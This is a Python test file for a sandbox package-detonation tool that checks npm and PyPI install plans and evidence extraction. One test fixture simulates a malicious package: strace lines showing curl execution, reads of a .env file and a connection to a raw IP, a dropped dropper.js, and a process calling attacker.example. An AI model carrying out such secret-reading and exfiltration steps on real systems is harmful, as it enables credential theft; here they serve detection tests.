from __future__ import annotations

from packageproof.core.config import Settings
from packageproof.models.schemas import AnalyzePackageRequest, RegistryResult
from packageproof.services.e2b_runner import DetonationPlan, E2BDetonator


def test_build_plan_pins_npm_version():
    detonator = E2BDetonator(Settings())
    request = AnalyzePackageRequest(ecosystem="npm", package="@scope/pkg", version="latest")
    registry = RegistryResult(
        ecosystem="npm",
        package="@scope/pkg",
        requested_version="latest",
        resolved_version="1.2.3",
        exists=True,
        metadata={"bin": {"pkg": "dist/cli.js"}},
    )

    plan = detonator.build_plan(request, registry)

    assert plan.package_spec == "@scope/pkg@1.2.3"
    assert "npm install" in plan.install_command
    assert "@scope/pkg" in plan.probe_command
    assert plan.extra_probe_commands


def test_build_plan_pins_pypi_version_and_import_probe():
    detonator = E2BDetonator(Settings())
    request = AnalyzePackageRequest(ecosystem="pypi", package="bad-pkg", version="latest")
    registry = RegistryResult(
        ecosystem="pypi",
        package="bad-pkg",
        requested_version="latest",
        resolved_version="9.9.9",
        exists=True,
    )

    plan = detonator.build_plan(request, registry)

    assert plan.package_spec == "bad-pkg==9.9.9"
    assert "python -m pip install" in plan.install_command
    assert "bad_pkg" in plan.probe_command


def test_extract_evidence_detects_canary_network_exec_and_file_changes():
    detonator = E2BDetonator(Settings())
    plan = DetonationPlan(
        package_spec="bad-pkg==1.0.0",
        workdir="/home/user/packageproof-work",
        install_command="pip install bad-pkg",
        probe_command="python -c import bad_pkg",
        extra_probe_commands=[],
    )
    before = "/home/user/.env\t36\t1.0\n"
    after = (
        "/home/user/.env\t40\t2.0\n"
        "/home/user/packageproof-work/dropper.js\t120\t2.0\n"
    )
    strace = "\n".join(
        [
            '123 execve("/usr/bin/curl", ["curl"], 0x0) = 0',
            '123 openat(AT_FDCWD, "/home/user/.env", O_RDONLY) = 3',
            '123 connect(4, {sa_family=AF_INET, sin_port=htons(443), '
            'sin_addr=inet_addr("203.0.113.10")}, 16) = 0',
        ]
    )
    command_results = {
        "setup": {"exit_code": 0, "stdout": "", "stderr": ""},
        "strace_check": {"exit_code": 0, "stdout": "/usr/bin/strace\n", "stderr": ""},
        "install": {"exit_code": 0, "stdout": "", "stderr": ""},
        "probe": {"exit_code": 0, "stdout": "", "stderr": ""},
        "ps_before": {"exit_code": 0, "stdout": "1 0 init init\n", "stderr": ""},
        "ps_after": {
            "exit_code": 0,
            "stdout": "1 0 init init\n99 1 curl curl https://attacker.example\n",
            "stderr": "",
        },
    }

    evidence = detonator.extract_evidence(
        plan=plan,
        command_results=command_results,
        before_snapshot=before,
        after_snapshot=after,
        strace_text=strace,
        canary_token="OPENAI_API_KEY",
    )

    assert evidence["filesystem"]["canary_accesses"][0]["path"] == "/home/user/.env"
    hosts = {event["host"] for event in evidence["network"]["events"]}
    assert {"203.0.113.10", "attacker.example"} <= hosts
    assert "/home/user/packageproof-work/dropper.js" in evidence["filesystem"]["added"]
    assert any(
        chain["type"] == "sandbox_possible_secret_exfiltration"
        for chain in evidence["behavior_chain"]
    )
    classifications = {
        event["host"]: event["classification"] for event in evidence["network"]["events"]
    }
    assert classifications["203.0.113.10"] == "raw_ip_or_cdn"
    assert evidence["process"]["events"][0]["type"] == "suspicious_process"
    assert evidence["artifacts"]["strace_line_count"] == 3
